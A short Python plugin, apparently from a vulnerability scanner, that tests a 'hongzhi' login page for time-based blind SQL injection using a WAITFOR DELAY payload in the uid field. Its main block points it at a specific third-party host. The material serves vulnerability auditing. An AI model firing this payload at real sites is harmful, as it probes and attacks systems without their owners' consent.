#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0107850

import time

def assign(service, arg):
    if service == "hongzhi":
        return True, arg
        
        
        
def audit(arg): 
    payload = 'checklogin.asp'
    postdata1 = 'uid=11111111&pwd=11111&imageField2.x=32&imageField2.y=7'
    postdata2 = 'uid=11111111%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&pwd=11111&imageField2.x=32&imageField2.y=7'
    url = arg + payload 
    t1 = time.time()
    code1, head, res1, errcode1, _ = curl.curl2(url,postdata1)
    t2 = time.time()
    code2, head, res2, errcode2, _ = curl.curl2(url,postdata2)
    t3 = time.time()
    errtime=t3-t2
    truetime=t2-t1
    if errtime-truetime > 3:
        security_hole(arg+payload)


if __name__ == '__main__':
    from dummy import *
    audit(assign('hongzhi', 'http://www.szfcsc.com:81/')[1])